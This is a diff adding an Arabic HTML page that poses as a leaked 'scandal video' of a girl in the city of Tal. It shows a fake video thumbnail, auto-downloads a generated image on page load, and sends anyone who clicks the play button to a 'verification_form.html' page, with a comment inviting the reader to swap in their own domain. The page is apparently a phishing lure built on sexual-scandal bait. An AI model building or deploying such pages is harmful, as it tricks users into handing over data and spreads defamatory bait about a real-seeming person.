@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>مشاهدة فديو فضيحة بنت في مدينة التل</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f2f5;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .video-container {
+            position: relative;
+            width: 600px;
+            height: 400px;
+            background-image: url('https://https://appsyria00.github.io/ASADALSNA/ALTAL.COM/proxyimage.png'); /* استبدل بصورة بنت */
+            background-size: cover;
+            background-position: center;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.3s;
+        }
+        .play-button::before {
+            content: '';
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+        }
+        .video-container:hover .play-button {
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <div class="video-container" id="capture">
+        <div class="play-button"></div>
+    </div>
+    <p style="font-size: 14px; color: #666;">فديو مسرب لبنت في مدينة التل </p>
+    <script>
+        // توليد الصورة عند تحميل الصفحة
+        window.onload = function() {
+            html2canvas(document.querySelector('#capture')).then(canvas => {
+                const link = document.createElement('a');
+                link.download = 'proxyimage.png';
+                link.href = canvas.toDataURL('image/png');
+                link.click(); // تحميل الصورة تلقائيًا
+            });
+
+            // التوجيه عند النقر
+            function redirectToForm() {
+                window.location.href = 'https://https://appsyria00.github.io/ASADALSNA/ALTAL.COM/verification_form.html'; // استبدل بدومينك
+            }
+            document.querySelector('.video-container').onclick = redirectToForm;
+        };
+    </script>
+</body>
+
+</html>
